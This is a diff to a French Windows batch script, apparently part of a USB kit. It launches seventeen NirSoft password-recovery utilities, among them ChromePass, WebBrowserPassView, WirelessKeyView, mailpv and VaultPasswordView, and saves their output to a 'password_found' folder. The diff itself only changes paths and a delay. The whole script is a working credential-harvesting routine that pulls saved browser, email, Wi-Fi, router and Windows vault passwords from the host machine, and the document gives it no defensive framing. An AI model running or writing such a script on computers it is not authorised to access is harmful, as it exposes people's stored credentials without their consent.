@@ -1,29 +1,29 @@
 echo.
-start autres/usb/pass/BulletsPassView.exe /stext autres/usb/password_found/BulletsPassView.txt
-start autres/usb/pass/ChromePass.exe /stext autres/usb/password_found/ChromePass.txt
-start autres/usb/pass/CredentialsFileView.exe /stext autres/usb/password_found/CredentialsFileView.txt
-start autres/usb/pass/DataProtectionDecryptor.exe /stext autres/usb/password_found/DataProtectionDecryptor.txt
-start autres/usb/pass/Dialupass.exe /stext autres/usb/password_found/Dialupass.txt
-start autres/usb/pass/EncryptedRegView.exe /stext autres/usb/password_found/EncryptedRegView.txt
-start autres/usb/pass/iepv.exe /stext autres/usb/password_found/iepv.txt
-start autres/usb/pass/mailpv.exe /stext autres/usb/password_found/mailpv.txt
-start autres/usb/pass/mspass.exe /stext autres/usb/password_found/mspass.txt
-start autres/usb/pass/netpass.exe /stext autres/usb/password_found/netpass.txt
-start autres/usb/pass/PasswordFox.exe /stext autres/usb/password_found/PasswordFox.txt
-start autres/usb/pass/PstPassword.exe /stext autres/usb/password_found/PstPassword.txt
-start autres/usb/pass/RouterPassView.exe /stext autres/usb/password_found/RouterPassView.txt
-start autres/usb/pass/SniffPass.exe /stext autres/usb/password_found/SniffPass.txt
-start autres/usb/pass/VaultPasswordView.exe /stext autres/usb/password_found/VaultPasswordView.txt
-start autres/usb/pass/WebBrowserPassView.exe /stext autres/usb/password_found/WebBrowserPassView.txt
-start autres/usb/pass/WirelessKeyView.exe /stext autres/usb/password_found/WirelessKeyView.txt
+start pass/BulletsPassView.exe /stext password_found/BulletsPassView.txt
+start pass/ChromePass.exe /stext password_found/ChromePass.txt
+start pass/CredentialsFileView.exe /stext password_found/CredentialsFileView.txt
+start pass/DataProtectionDecryptor.exe /stext password_found/DataProtectionDecryptor.txt
+start pass/Dialupass.exe /stext password_found/Dialupass.txt
+start pass/EncryptedRegView.exe /stext password_found/EncryptedRegView.txt
+start pass/iepv.exe /stext password_found/iepv.txt
+start pass/mailpv.exe /stext password_found/mailpv.txt
+start pass/mspass.exe /stext password_found/mspass.txt
+start pass/netpass.exe /stext password_found/netpass.txt
+start pass/PasswordFox.exe /stext password_found/PasswordFox.txt
+start pass/PstPassword.exe /stext password_found/PstPassword.txt
+start pass/RouterPassView.exe /stext password_found/RouterPassView.txt
+start pass/SniffPass.exe /stext password_found/SniffPass.txt
+start pass/VaultPasswordView.exe /stext password_found/VaultPasswordView.txt
+start pass/WebBrowserPassView.exe /stext password_found/WebBrowserPassView.txt
+start pass/WirelessKeyView.exe /stext password_found/WirelessKeyView.txt
 echo.
 echo        ##########################################################
 echo        #                                                        #
 echo        #                                                        #
 echo        #         Veuillez lire les fichiers dans                #
-echo        #         le autres/usb/dossier password_found.          #
+echo        #         le autres/usb dossier password_found.          #
 echo        #                                                        #
 echo        #                                                        #
 echo        ##########################################################
 echo.
-ping 127.0.0.1 -n 2 > nul
+ping 127.0.0.1 -n 5 > nul
